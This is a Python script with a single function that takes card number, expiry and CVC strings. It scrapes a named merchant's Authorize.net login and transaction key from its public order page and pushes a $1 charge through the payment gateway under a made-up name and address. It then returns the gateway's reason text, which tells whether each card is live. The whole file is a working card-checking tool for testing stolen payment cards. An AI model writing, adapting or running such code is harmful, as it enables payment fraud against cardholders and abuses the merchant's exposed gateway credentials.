import requests,re
import random
def Tele(ccx):
	import requests
	ccx=ccx.strip()
	n = ccx.split("|")[0]
	mm = ccx.split("|")[1]
	yy = ccx.split("|")[2]
	cvc = ccx.split("|")[3]
	if "20" in yy:#Mo3gza
		yy = yy.split("20")[1]
	r = requests.session()
	
	random_amount1 = random.randint(1, 9)
	random_amount2 = random.randint(1, 99)

	headers = {
	    'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
	    'Accept-Language': 'en-TH,en;q=0.9,th-DZ;q=0.8,th;q=0.7,en-GB;q=0.6,en-US;q=0.5',
	    'Connection': 'keep-alive',
	    'Referer': 'https://www.behindthename.com/random/',
	    'Sec-Fetch-Dest': 'document',
	    'Sec-Fetch-Mode': 'navigate',
	    'Sec-Fetch-Site': 'same-origin',
	    'Sec-Fetch-User': '?1',
	    'Upgrade-Insecure-Requests': '1',
	    'User-Agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/132.0.0.0 Mobile Safari/537.36',
	    'sec-ch-ua': '"Not A(Brand";v="8", "Chromium";v="132"',
	    'sec-ch-ua-mobile': '?1',
	    'sec-ch-ua-platform': '"Android"',
	}
	
	params = {
	    'gender': 'both',
	    'number': '2',
	    'sets': '1',
	    'surname': '',
	    'all': 'yes',
	}
	
	response = requests.get('https://www.behindthename.com/random/random.php', params=params, headers=headers)
	
	name = re.search(r'class="plain">(.*?)</a>', response.text).group(1)
	#print(name)

	headers = {
	    'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
	    'Accept-Language': 'en-TH,en;q=0.9,th-DZ;q=0.8,th;q=0.7,en-GB;q=0.6,en-US;q=0.5',
	    'Cache-Control': 'max-age=0',
	    'Connection': 'keep-alive',
	    'Referer': 'https://www.google.com/',
	    'Sec-Fetch-Dest': 'document',
	    'Sec-Fetch-Mode': 'navigate',
	    'Sec-Fetch-Site': 'cross-site',
	    'Sec-Fetch-User': '?1',
	    'Upgrade-Insecure-Requests': '1',
	    'User-Agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/132.0.0.0 Mobile Safari/537.36',
	    'sec-ch-ua': '"Not A(Brand";v="8", "Chromium";v="132"',
	    'sec-ch-ua-mobile': '?1',
	    'sec-ch-ua-platform': '"Android"',
	}
	
	response = requests.get('https://www.mfpco.com/orders/gatherInfo.php', headers=headers)
	
	x_login = re.search(r'name="x_login" value="(.*?)"', response.text).group(1)
	#print(x_login)
	x_transaction_key = re.search(r'name="x_transaction_key" value="(.*?)"', response.text).group(1)
	#print(x_transaction_key)
	pmt = re.search(r'name="x_fp_sequence" value="(.*?)"', response.text).group(1)
	#print(pmt)
	
	headers = {
	    'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
	    'Accept-Language': 'en-TH,en;q=0.9,th-DZ;q=0.8,th;q=0.7,en-GB;q=0.6,en-US;q=0.5',
	    'Cache-Control': 'max-age=0',
	    'Connection': 'keep-alive',
	    'Content-Type': 'application/x-www-form-urlencoded',
	    'Origin': 'https://www.mfpco.com',
	    'Referer': 'https://www.mfpco.com/orders/gatherInfo.php',
	    'Sec-Fetch-Dest': 'document',
	    'Sec-Fetch-Mode': 'navigate',
	    'Sec-Fetch-Site': 'same-origin',
	    'Sec-Fetch-User': '?1',
	    'Upgrade-Insecure-Requests': '1',
	    'User-Agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/132.0.0.0 Mobile Safari/537.36',
	    'sec-ch-ua': '"Not A(Brand";v="8", "Chromium";v="132"',
	    'sec-ch-ua-mobile': '?1',
	    'sec-ch-ua-platform': '"Android"',
	}
	
	data = {
	    'x_login': f'{x_login}',
	    'x_transaction_key': f'{x_transaction_key}',
	    'x_fp_hash': '',
	    'x_fp_sequence': f'{pmt}',
	    'x_fp_timestamp': '',
	    'x_type': 'AUTH_CAPTURE',
	    'x_amount': '0',
	    'x_version': '3.1',
	    'x_email': '',
	    'x_phone': '',
	    'x_cust_id': '',
	    'x_delim_data': 'FALSE',
	    'x_relay_response': 'TRUE',
	    'x_relay_url': '',
	    'pmtorderid': f'{pmt}',
	    'x_invoice_num': f'{pmt}',
	    'pmt_invoice_num': '1',
	    'pmt_customer_num': '1',
	    'pmt_amount': '1',
	    'x_first_name': 'Rodam',
	    'x_last_Name': 'User',
	    'x_address': 'Street 27',
	    'x_city': 'New York',
	    'x_state': 'NY',
	    'x_zip': '10080',
	    'x_card_num': f'{n}',
	    'x_exp_date': '',
	    'expmonth': f'{mm}',
	    'expyear': f'20{yy}',
	    'x_card_code': f'{cvc}',
	}
	
	response = requests.post('https://www.mfpco.com/orders/createANRequest.php', headers=headers, data=data)
	
	
	x_fp_hash = re.search(r'value\s*=\s*"([a-fA-F0-9]{32})"', response.text).group(1)
	#print(x_fp_hash)
	x_fp_timestamp = re.search(r"x_fp_timestamp'\]\.value\s*=\s*\"(\d{10})\"", response.text).group(1)
	#print(x_fp_timestamp)
	
	headers = {
	    'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
	    'Accept-Language': 'en-TH,en;q=0.9,th-DZ;q=0.8,th;q=0.7,en-GB;q=0.6,en-US;q=0.5',
	    'Cache-Control': 'max-age=0',
	    'Connection': 'keep-alive',
	    'Content-Type': 'application/x-www-form-urlencoded',
	    'Origin': 'https://www.mfpco.com',
	    'Referer': 'https://www.mfpco.com/',
	    'Sec-Fetch-Dest': 'document',
	    'Sec-Fetch-Mode': 'navigate',
	    'Sec-Fetch-Site': 'cross-site',
	    'Upgrade-Insecure-Requests': '1',
	    'User-Agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/132.0.0.0 Mobile Safari/537.36',
	    'sec-ch-ua': '"Not A(Brand";v="8", "Chromium";v="132"',
	    'sec-ch-ua-mobile': '?1',
	    'sec-ch-ua-platform': '"Android"',
	}
	
	data = {
	    'x_login': f'{x_login}',
	    'x_transaction_key': f'{x_transaction_key}',
	    'x_fp_hash': f'{x_fp_hash}',
	    'x_fp_sequence': f'{pmt}',
	    'x_fp_timestamp': f'{x_fp_timestamp}',
	    'x_type': 'AUTH_CAPTURE',
	    'x_amount': '1',
	    'x_version': '3.1',
	    'x_email': '',
	    'x_phone': '',
	    'x_cust_id': '1',
	    'x_delim_data': 'FALSE',
	    'x_relay_response': 'TRUE',
	    'x_relay_url': 'https://mfpco.com/orders/processANResponse.php',
	    'pmtorderid': f'{pmt}',
	    'x_invoice_num': '1',
	    'pmt_invoice_num': '1',
	    'pmt_customer_num': '1',
	    'pmt_amount': '1',
	    'x_first_name': 'Rodam',
	    'x_last_Name': 'User',
	    'x_address': 'Street 27',
	    'x_city': 'New York',
	    'x_state': 'NY',
	    'x_zip': '10080',
	    'x_card_num': f'{n}',
	    'x_exp_date': f'{mm}{yy}',
	    'expmonth': f'{mm}',
	    'expyear': f'20{yy}',
	    'x_card_code': f'{cvc}',
	}
	
	response = requests.post('https://secure.authorize.net/gateway/transact.dll', headers=headers, data=data)
	
	result = re.search(r'name="x_response_reason_text" value="(.*?)"', response.text).group(1)
	return (result)
